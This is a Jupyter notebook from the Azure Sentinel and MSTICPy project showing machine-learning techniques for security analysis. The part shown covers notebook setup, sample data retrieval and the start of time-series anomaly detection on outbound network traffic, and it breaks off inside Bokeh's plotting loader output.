{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Azure Sentinel Notebooks and <i>MSTICPy</i>\n",
    "## Examples of machine learning techniques in Jupyter notebooks\n",
    "\n",
    "Author: Ian Hellen\n",
    "<br>Co-Authors: Pete Bryan, Ashwin Patil\n",
    "\n",
    "Released: 26 Oct 2020"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Notebook Setup\n",
    "\n",
    "Please ensure that MSTICPy is installed before continuing with this notebook.\n",
    "\n",
    "The nbinit module loads required libraries and optionally installs require packages."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "gather": {
     "logged": 1618337296472
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<h3>Starting Notebook setup...</h3>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "Note: you may need to scroll down this cell to see the full output."
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<h4>Starting notebook pre-checks...</h4>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "Checking Python kernel version..."
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "Info: Python kernel version 3.8.1 OK<br>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "Checking msticpy version...<br>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "Info: msticpy version 1.0.0rc5 OK<br>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "Running install to ensure extras are installed...<br>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<br>Running pip install --no-input --quiet msticpy[ml]==1.0.0rc5 - this may take a few moments...<br>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<br>No msticpyconfig.yaml found. Will use msticpyconfig.yaml in user folder /mnt/batch/tasks/shared/LS_root/mounts/clusters/ianhelle-azml7/code/Users/ianhelle<br>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<h4>Notebook pre-checks complete.</h4>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<hr><h4>Starting Notebook initialization...</h4>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "msticpy version installed: 1.0.0rc5 latest published: 0.9.0<br>Latest version is installed.<br> <br>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "Processing imports.... <br>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "Imported: pd (pandas), IPython.get_ipython, IPython.display.display, IPython.display.HTML, IPython.display.Markdown, widgets (ipywidgets), pathlib.Path, plt (matplotlib.pyplot), matplotlib.MatplotlibDeprecationWarning, sns (seaborn), np (numpy), msticpy.data.QueryProvider, msticpy.nbtools.foliummap.FoliumMap, msticpy.common.utility.md, msticpy.common.utility.md_warn, msticpy.common.wsconfig.WorkspaceConfig, msticpy.datamodel.pivot.Pivot, msticpy.datamodel.entities <br>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "Checking configuration.... <br>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "Setting notebook options.... <br>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<h4>Notebook initialization complete</h4>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from pathlib import Path\r\n",
    "from IPython.display import display, HTML\r\n",
    "import warnings\r\n",
    "warnings.simplefilter(action='ignore', category=FutureWarning)\r\n",
    "\r\n",
    "REQ_PYTHON_VER = \"3.6\"\r\n",
    "REQ_MSTICPY_VER = \"1.0.0\"\r\n",
    "REQ_MP_EXTRAS = [\"ml\"]\r\n",
    "\r\n",
    "update_nbcheck = (\r\n",
    "    \"<p style='color: orange; text-align=left'>\"\r\n",
    "    \"<b>Warning: we needed to update '<i>utils/nb_check.py</i>'</b><br>\"\r\n",
    "    \"Please restart the kernel and re-run this cell.\"\r\n",
    "    \"</p>\"\r\n",
    ")\r\n",
    "\r\n",
    "display(HTML(\"<h3>Starting Notebook setup...</h3>\"))\r\n",
    "if Path(\"./utils/nb_check.py\").is_file():\r\n",
    "    try:\r\n",
    "        from utils.nb_check import check_versions\r\n",
    "    except ImportError as err:\r\n",
    "        %xmode Minimal\r\n",
    "        !curl https://raw.githubusercontent.com/Azure/Azure-Sentinel-Notebooks/master/utils/nb_check.py > ./utils/nb_check.py 2>/dev/null\r\n",
    "        display(HTML(update_nbcheck))\r\n",
    "    if \"check_versions\" not in globals():\r\n",
    "        raise ImportError(\"Old version of nb_check.py detected - see instructions below.\")\r\n",
    "    %xmode Verbose\r\n",
    "    check_versions(REQ_PYTHON_VER, REQ_MSTICPY_VER, REQ_MP_EXTRAS)\r\n",
    "  \r\n",
    "from msticpy.nbtools import nbinit\r\n",
    "nbinit.init_notebook(namespace=globals());\r\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Retrieve sample data files"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "gather": {
     "logged": 1618336504315
    }
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "28919e8e75f74b178cadb2e67cdc305b",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "File download:   0%|          | 0/4 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "data/exchange_admin.pkl, data/processes_on_host.pkl, data/timeseries.pkl, data/data_queries.yaml, "
     ]
    }
   ],
   "source": [
    "from urllib.request import urlretrieve\n",
    "from pathlib import Path\n",
    "from tqdm.auto import tqdm\n",
    "\n",
    "github_uri = \"https://raw.githubusercontent.com/Azure/Azure-Sentinel-Notebooks/master/{file_name}\"\n",
    "github_files = {\n",
    "    \"exchange_admin.pkl\": \"data\",\n",
    "    \"processes_on_host.pkl\": \"data\",\n",
    "    \"timeseries.pkl\": \"data\",\n",
    "    \"data_queries.yaml\": \"data\",\n",
    "}\n",
    "\n",
    "Path(\"data\").mkdir(exist_ok=True)\n",
    "for file, path in tqdm(github_files.items(), desc=\"File download\"):\n",
    "    file_path = Path(path).joinpath(file)\n",
    "    print(file_path, end=\", \")\n",
    "    url_path = f\"{path}/{file}\" if path else file\n",
    "    urlretrieve(\n",
    "        github_uri.format(file_name=url_path),\n",
    "        file_path\n",
    "    )\n",
    "    assert Path(file_path).is_file()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<hr>\n",
    "\n",
    "# Time Series Analysis\n",
    "\n",
    "## Query network data\n",
    "The starting point is ingesting data to analyze.\n",
    "\n",
    "MSTICpy contains a number of [query providers](https://msticpy.readthedocs.io/en/latest/data_acquisition/DataProviders.html) \n",
    "that let you query and return data from several different sources. \n",
    "\n",
    "Below we are using the LocalData query provider to return data from sample files.<br><br>\n",
    "\n",
    "Data is returned in a Pandas [DataFrame](https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.html) for easy manipulation and to provide a common interface for other features in MSTICpy.<br>\n",
    "Here we are getting a summary of our network traffic for the time period we are interested in.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "gather": {
     "logged": 1618336448011
    }
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8fa1d1b1b1254d15aac08c7923c03455",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "VBox(children=(HTML(value='<h4>Set query time boundaries</h4>'), HBox(children=(DatePicker(value=datetime.date…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "query_range = nbwidgets.QueryTime(\n",
    "    origin_time=pd.Timestamp(\"2020-07-13 00:00:00\"),\n",
    "    before=1,\n",
    "    units=\"week\"\n",
    ")\n",
    "query_range"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<hr>\n",
    "\n",
    "This query fetches the total number of bytes send outbound on the network, grouped by hour.\n",
    "\n",
    "The input to the Timeseries analysis needs to be in the form of:\n",
    "- a datetime index (in a regular interval like an hour or day)\n",
    "- a scalar value used to determine anomalous values based on periodicity\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "gather": {
     "logged": 1618336452828
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Connected.\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<p style='font-size: 130%'>Sample data:</p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.dataresource+json": {
       "data": [
        {
         "TimeGenerated": "2020-07-06T00:00:00.000Z",
         "TotalBytesSent": "10823"
        },
        {
         "TimeGenerated": "2020-07-06T01:00:00.000Z",
         "TotalBytesSent": "14821"
        },
        {
         "TimeGenerated": "2020-07-06T02:00:00.000Z",
         "TotalBytesSent": "13532"
        }
       ],
       "schema": {
        "fields": [
         {
          "name": "TimeGenerated",
          "type": "datetime",
          "tz": "UTC"
         },
         {
          "name": "TotalBytesSent",
          "type": "string"
         }
        ],
        "pandas_version": "0.20.0",
        "primaryKey": [
         "TimeGenerated"
        ]
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TotalBytesSent</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>2020-07-06 00:00:00+00:00</th>\n",
       "      <td>10823</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-06 01:00:00+00:00</th>\n",
       "      <td>14821</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2020-07-06 02:00:00+00:00</th>\n",
       "      <td>13532</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                          TotalBytesSent\n",
       "TimeGenerated                           \n",
       "2020-07-06 00:00:00+00:00          10823\n",
       "2020-07-06 01:00:00+00:00          14821\n",
       "2020-07-06 02:00:00+00:00          13532"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Initialize the data provider and connect to our Splunk instance.\n",
    "qry_prov = QueryProvider(\"LocalData\", data_paths=[\"./data\"], query_paths=[\"./data\"])\n",
    "qry_prov.connect()\n",
    "\n",
    "ob_bytes_per_hour = qry_prov.Network.get_network_summary(query_range)\n",
    "md(\"Sample data:\", \"large\")\n",
    "ob_bytes_per_hour.head(3)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Using Timeseries decomposition to detect anomalous network activity\n",
    "\n",
    "Below we use MSTICpy's [time series analysis](https://msticpy.readthedocs.io/en/latest/msticpy.analysis.html?highlight=timeseries#module-msticpy.analysis.timeseries) \n",
    "machine learning capabilities to identify anomalies in our network traffic for further investigation.<br>\n",
    "As well as computing anomalies we visualize the data so that we can more easily see where these anomalies present themselves.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "gather": {
     "logged": 1618336456021
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a href=\"https://bokeh.org\" target=\"_blank\" class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span id=\"1002\">Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "\n",
       "(function(root) {\n",
       "  function now() {\n",
       "    return new Date();\n",
       "  }\n",
       "\n",
       "  var force = true;\n",
       "\n",
       "  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n",
       "    root._bokeh_onload_callbacks = [];\n",
       "    root._bokeh_is_loading = undefined;\n",
       "  }\n",
       "\n",
       "  var JS_MIME_TYPE = 'application/javascript';\n",
       "  var HTML_MIME_TYPE = 'text/html';\n",
       "  var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n",
       "  var CLASS_NAME = 'output_bokeh rendered_html';\n",
       "\n",
       "  /**\n",
       "   * Render data to the DOM node\n",
       "   */\n",
       "  function render(props, node) {\n",
       "    var script = document.createElement(\"script\");\n",
       "    node.appendChild(script);\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when an output is cleared or removed\n",
       "   */\n",
       "  function handleClearOutput(event, handle) {\n",
       "    var cell = handle.cell;\n",
       "\n",
       "    var id = cell.output_area._bokeh_element_id;\n",
       "    var server_id = cell.output_area._bokeh_server_id;\n",
       "    // Clean up Bokeh references\n",
       "    if (id != null && id in Bokeh.index) {\n",
       "      Bokeh.index[id].model.document.clear();\n",
       "      delete Bokeh.index[id];\n",
       "    }\n",
       "\n",
       "    if (server_id !== undefined) {\n",
       "      // Clean up Bokeh references\n",
       "      var cmd = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n",
       "      cell.notebook.kernel.execute(cmd, {\n",
       "        iopub: {\n",
       "          output: function(msg) {\n",
       "            var id = msg.content.text.trim();\n",
       "            if (id in Bokeh.index) {\n",
       "              Bokeh.index[id].model.document.clear();\n",
       "              delete Bokeh.index[id];\n",
       "            }\n",
       "          }\n",
       "        }\n",
       "      });\n",
       "      // Destroy server and session\n",
       "      var cmd = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n",
       "      cell.notebook.kernel.execute(cmd);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when a new output is added\n",
       "   */\n",
       "  function handleAddOutput(event, handle) {\n",
       "    var output_area = handle.output_area;\n",
       "    var output = handle.output;\n",
       "\n",
       "    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n",
       "    if ((output.output_type != \"display_data\") || (!Object.prototype.hasOwnProperty.call(output.data, EXEC_MIME_TYPE))) {\n",
       "      return\n",
       "    }\n",
       "\n",
       "    var toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n",
       "\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n",
       "      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n",
       "      // store reference to embed id on output_area\n",
       "      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n",
       "    }\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n",
       "      var bk_div = document.createElement(\"div\");\n",
       "      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n",
       "      var script_attrs = bk_div.children[0].attributes;\n",
       "      for (var i = 0; i < script_attrs.length; i++) {\n",
       "        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n",
       "        toinsert[toinsert.length - 1].firstChild.textContent = bk_div.children[0].textContent\n",
       "      }\n",
       "      // store reference to server id on output_area\n",
       "      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n",
       "    }\n",
       "  }\n",
       "\n",
       "  function register_renderer(events, OutputArea) {\n",
       "\n",
       "    function append_mime(data, metadata, element) {\n",
       "      // create a DOM node to render to\n",
       "      var toinsert = this.create_output_subarea(\n",
       "        metadata,\n",
       "        CLASS_NAME,\n",
       "        EXEC_MIME_TYPE\n",
       "      );\n",
       "      this.keyboard_manager.register_events(toinsert);\n",
       "      // Render to node\n",
       "      var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n",
       "      render(props, toinsert[toinsert.length - 1]);\n",
       "      element.append(toinsert);\n",
       "      return toinsert\n",
       "    }\n",
       "\n",
       "    /* Handle when an output is cleared or removed */\n",
       "    events.on('clear_output.CodeCell', handleClearOutput);\n",
       "    events.on('delete.Cell', handleClearOutput);\n",
       "\n",
       "    /* Handle when a new output is added */\n",
       "    events.on('output_added.OutputArea', handleAddOutput);\n",
       "\n",
       "    /**\n",
       "     * Register the mime type and append_mime function with output_area\n",
       "     */\n",
       "    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n",
       "      /* Is output safe? */\n",
       "      safe: true,\n",
       "      /* Index of renderer in `output_area.display_order` */\n",
       "      index: 0\n",
       "    });\n",
       "  }\n",
       "\n",
       "  // register the mime type if in Jupyter Notebook environment and previously unregistered\n",
       "  if (root.Jupyter !== undefined) {\n",
       "    var events = require('base/js/events');\n",
       "    var OutputArea = require('notebook/js/outputarea').OutputArea;\n",
       "\n",
       "    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n",
       "      register_renderer(events, OutputArea);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  \n",
       "  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n",
       "    root._bokeh_timeout = Date.now() + 5000;\n",
       "    root._bokeh_failed_load = false;\n",
       "  }\n",
       "\n",
       "  var NB_LOAD_WARNING = {'data': {'text/html':\n",
       "     \"<div style='background-color: #fdd'>\\n\"+\n",
       "     \"<p>\\n\"+\n",
       "     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n",
       "     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n",
       "     \"</p>\\n\"+\n",
       "     \"<ul>\\n\"+\n",
       "     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n",
       "     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n",
       "     \"</ul>\\n\"+\n",
       "     \"<code>\\n\"+\n",
       "     \"from bokeh.resources import INLINE\\n\"+\n",
       "     \"output_notebook(resources=INLINE)\\n\"+\n",
       "     \"</code>\\n\"+\n",
       "     \"</div>\"}};\n",
       "\n",
       "  function display_loaded() {\n",
       "    var el = document.getElementById(\"1002\");\n",
       "    if (el != null) {\n",
       "      el.textContent = \"BokehJS is loading...\";\n",
       "    }\n",
       "    if (root.Bokeh !== undefined) {\n",
       "      if (el != null) {\n",
       "        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n",
       "      }\n",
       "    } else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(display_loaded, 100)\n",
       "    }\n",
       "  }\n",
       "\n",
       "\n",
       "  function run_callbacks() {\n",
       "    try {\n",
       "      root._bokeh_onload_callbacks.forEach(function(callback) {\n",
       "        if (callback != null)\n",
       "          callback();\n",
       "      });\n",
       "    } finally {\n",
       "      delete root._bokeh_onload_callbacks\n",
       "    }\n",
       "    console.debug(\"Bokeh: all callbacks have finished\");\n",
       "  }\n",
       "\n",
       "  function load_libs(css_urls, js_urls, callback) {\n",
       "    if (css_urls == null) css_urls = [];\n",
       "    if (js_urls == null) js_urls = [];\n",
       "\n",
       "    root._bokeh_onload_callbacks.push(callback);\n",
       "    if (root._bokeh_is_loading > 0) {\n",
       "      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n",
       "      return null;\n",
       "    }\n",
       "    if (js_urls == null || js_urls.length === 0) {\n",
       "      run_callbacks();\n",
       "      return null;\n",
       "    }\n",
       "    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n",
       "    root._bokeh_is_loading = css_urls.length + js_urls.length;\n",
       "\n",
       "    function on_load() {\n",
       "      root._bokeh_is_loading--;\n",
       "      if (root._bokeh_is_loading === 0) {\n",
       "        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n",
       "        run_callbacks()\n",
       "      }\n",
       "    }\n",
       "\n",
       "    function on_error(url) {\n",
       "      console.error(\"failed to load \" + url);\n",
       "    }\n",
       "\n",
       "    for (let i = 0; i < css_urls.length; i++) {\n",
       "      const url = css_urls[i];\n",
       "      const element = document.createElement(\"link\");\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error.bind(null, url);\n",
       "      element.rel = \"stylesheet\";\n",
       "      element.type = \"text/css\";\n",
       "      element.href = url;\n",
       "      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n",
       "      document.body.appendChild(element);\n",
       "    }\n",
       "\n",
       "    const hashes = {\"https://cdn.bokeh.org/bokeh/release/bokeh-2.3.0.min.js\": \"HjagQp6T0/7bxYTAXbLotF1MLAGWmhkY5siA1Gc/pcEgvgRPtMsRn0gQtMwGKiw1\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.3.0.min.js\": \"ZEPPTjL+mdyqgIq+/pl9KTwzji8Kow2NnI3zWY8+sFinWP/SYJ80BnfeJsa45iYj\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.3.0.min.js\": \"exLqv2ACDRIaV7ZK1iL8aGzGYQvKVuT3U2CT7FsQREBxRah6JrkVCoFy0koY1YqV\"};\n",
       "\n",
       "    for (let i = 0; i < js_urls.length; i++) {\n",
       "      const url = js_urls[i];\n",
       "      const element = document.createElement('script');\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error.bind(null, url);\n",
       "      element.async = false;\n",
       "      element.src = url;\n",
       "      if (url in hashes) {\n",
       "        element.crossOrigin = \"anonymous\";\n",
       "        element.integrity = \"sha384-\" + hashes[url];\n",
       "      }\n",
       "      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n",
       "      document.head.appendChild(element);\n",
       "    }\n",
       "  };\n",
       "\n",
       "  function inject_raw_css(css) {\n",
       "    const element = document.createElement(\"style\");\n",
       "    element.appendChild(document.createTextNode(css));\n",
       "    document.body.appendChild(element);\n",
       "  }\n",
       "\n",
       "  \n",
       "  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.3.0.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.3.0.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.3.0.min.js\"];\n",
       "  var css_urls = [];\n",
       "  \n",
       "\n",
       "  var inline_js = [\n",
       "    function(Bokeh) {\n",
       "      Bokeh.set_log_level(\"info\");\n",
       "    },\n",
       "    function(Bokeh) {\n",
       "    \n",
       "    \n",
       "    }\n",
       "  ];\n",
       "\n",
       "  function run_inline_js() {\n",
       "    \n",
       "    if (root.Bokeh !== undefined || force === true) {\n",
       "      \n",
       "    for (var i = 0; i < inline_js.length; i++) {\n",
       "      inline_js[i].call(root, root.Bokeh);\n",
       "    }\n",
       "    if (force === true) {\n",
       "        display_loaded();\n",
       "      }} else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(run_inline_js, 100);\n",
       "    } else if (!root._bokeh_failed_load) {\n",
       "      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n",
       "      root._bokeh_failed_load = true;\n",
       "    } else if (force !== true) {\n",
       "      var cell = $(document.getElementById(\"1002\")).parents('.cell').data().cell;\n",
       "      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n",
       "    }\n",
       "\n",
       "  }\n",
       "\n",
       "  if (root._bokeh_is_loading === 0) {\n",
       "    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n",
       "    run_inline_js();\n",
       "  } else {\n",
       "    load_libs(css_urls, js_urls, function() {\n",
       "      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n",
       "      run_inline_js();\n",
       "    });\n",
       "  }\n",
       "}(window));"
      ],
      "application/vnd.bokehjs_load.v0+json": "\n(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  var force = true;\n\n  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\n  \n\n  \n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  var NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded() {\n    var el = document.getElementById(\"1002\");\n    if (el != null) {\n      el.textContent = \"BokehJS is loading...\";\n    }\n    if (root.Bokeh !== undefined) {\n      if (el != null) {\n        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(display_loaded, 100)\n    }\n  }\n\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) {\n        if (callback != null)\n          callback();\n      });\n    } finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.debug(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(css_urls, js_urls, callback) {\n    if (css_urls == null) css_urls = [];\n    if (js_urls == null) js_urls = [];\n\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = css_urls.length + js_urls.length;\n\n    function on_load() {\n      root._bokeh_is_loading--;\n      if (root._bokeh_is_loading === 0) {\n        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n        run_callbacks()\n      }\n    }\n\n    function on_error(url) {\n      console.error(\"failed to load \" + url);\n    }\n\n    for (let i = 0; i < css_urls.length; i++) {\n      const url = css_urls[i];\n      const element = document.createElement(\"link\");\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.rel = \"stylesheet\";\n      element.type = \"text/css\";\n      element.href = url;\n      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n      document.body.appendChild(element);\n    }\n\n    const hashes = {\"https://cdn.bokeh.org/bokeh/release/bokeh-2.3.0.min.js\": \"HjagQp6T0/7bxYTAXbLotF1MLAGWmhkY5siA1Gc/pcEgvgRPtMsRn0gQtMwGKiw1\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.3.0.min.js\": \"ZEPPTjL+mdyqgIq+/pl9KTwzji8Kow2NnI3zWY8+sFinWP/SYJ80BnfeJsa45iYj\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.3.0.min.js\": \"exLqv2ACDRIaV7ZK1iL8aGzGYQvKVuT3U2CT7FsQREBxRah6JrkVCoFy0koY1YqV\"};\n\n    for (let i = 0; i < js_urls.length; i++) {\n      const url = js_urls[i];\n      const element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error.bind(null, url);\n      element.async = false;\n      element.src = url;\n      if (url in hashes) {\n        element.crossOrigin = \"anonymous\";\n        element.integrity = \"sha384-\" + hashes[url];\n      }\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n  };\n\n  function 